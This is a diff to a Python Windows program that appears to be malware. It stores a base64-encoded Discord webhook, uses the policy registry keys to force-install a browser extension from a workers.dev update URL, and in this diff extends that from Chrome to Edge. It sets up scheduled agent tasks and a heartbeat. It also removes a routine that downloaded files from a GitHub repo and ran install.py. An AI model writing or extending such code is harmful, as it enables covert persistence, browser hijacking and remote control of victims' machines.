@@ -8,7 +8,10 @@ import winreg
 WEBHOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU1OTQ1ODQ1MTA2NTkyOTc1MS9qQlZxRmJZdW9ya3M2VVY3aE03MzZ3SFduSTB1OEk5c1NfM2RZVGdMV3g5bVZwZnVVS0hHRzFkZVlUZ0hvazJLazVqdQ=="
 
 EXT_REG_VALUE = "clfbahpbgmlbahejgcbninkkbljjnpki;https://pc-lamartin.anna-benbekthi.workers.dev/update.xml"
-EXT_REG_KEY = r"Software\Policies\Google\Chrome\ExtensionInstallForcelist"
+EXT_REG_KEY = {
+    "chrome": r"Software\Policies\Google\Chrome\ExtensionInstallForcelist",
+    "msedge": r"Software\Policies\Microsoft\Edge\ExtensionInstallForcelist"
+}
 
 try:
     import win32com.client
@@ -241,34 +244,7 @@ def manage_user_tasks():
         create_user_task(f"{domain}\\{user}", tname)
 
 def setup_updated_version():
-    # ===== CONFIG =====
-    OWNER = "Proutman67"          # github username or org
-    REPO = "educational"       # repository name
-    SUBFOLDER = "newsetup"      # path inside repo
-    FILE_TO_RUN = "install.py"    # file to call after download
-    BRANCH = "main"            # usually "main" or "master"
-    # ==================
-
-    API_URL = f"https://api.github.com/repos/{OWNER}/{REPO}/contents/{SUBFOLDER}?ref={BRANCH}"
-
-    response = requests.get(API_URL)
-    response.raise_for_status()
-    files = response.json()
-
-    dir = Path(tempfile.gettempdir()) / "tmp"
-    os.makedirs(dir, exist_ok=True)
-
-    for item in files:
-        if item["type"] == "file":
-            file_name = item["name"]
-            download_url = item["download_url"]
-
-            file_data = requests.get(download_url).content
-
-            with open(dir / file_name, "wb") as f:
-                f.write(file_data)
-
-    subprocess.run(["python", dir / FILE_TO_RUN], check=True)
+    pass # duownload.py
 
 def is_old_task(taskname):
     return ("MyApp_SystemAgent" in taskname or "MyApp_UserAgent" in taskname)
@@ -382,22 +358,9 @@ def manage_updates():
 
         sys.exit()
 
-def install_ext():
+def ext_installed(reg_key):
     try:
-        with winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, EXT_REG_KEY) as key:
-            winreg.SetValueEx(
-                key,
-                "67",
-                0,
-                winreg.REG_SZ,
-                EXT_REG_VALUE
-            )
-    except:
-        pass
-
-def is_chrome_ext_installed():
-    try:
-        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, EXT_REG_KEY, 0, winreg.KEY_READ) as key:
+        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_key, 0, winreg.KEY_READ) as key:
             i = 0
             while True:
                 try:
@@ -411,6 +374,47 @@ def is_chrome_ext_installed():
         return False
 
     return False
+
+def install_ext():
+    for reg_key in EXT_REG_KEY.values():
+        if ext_installed(reg_key):
+            continue
+        try:
+            with winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, reg_key) as key:
+                winreg.SetValueEx(
+                    key,
+                    "67",
+                    0,
+                    winreg.REG_SZ,
+                    EXT_REG_VALUE
+                )
+        except:
+            pass
+
+def uninstall_ext():
+    for reg_key in EXT_REG_KEY.values():
+        try:
+            with winreg.OpenKey(
+                winreg.HKEY_LOCAL_MACHINE,
+                reg_key,
+                0,
+                winreg.KEY_SET_VALUE | winreg.KEY_QUERY_VALUE
+            ) as key:
+                i = 0
+                while True:
+                    try:
+                        name, value, _ = winreg.EnumValue(key, i)
+                        if value == EXT_REG_VALUE:
+                            winreg.DeleteValue(key, name)
+                        else:
+                            i += 1
+                    except OSError:
+                        break
+        except OSError:
+            pass
+
+def is_chrome_ext_installed():
+    return {brws_type: ext_installed(reg_key) for brws_type, reg_key in EXT_REG_KEY.items()}
 
 def heartbeat():
     global FIRST_MESSAGE
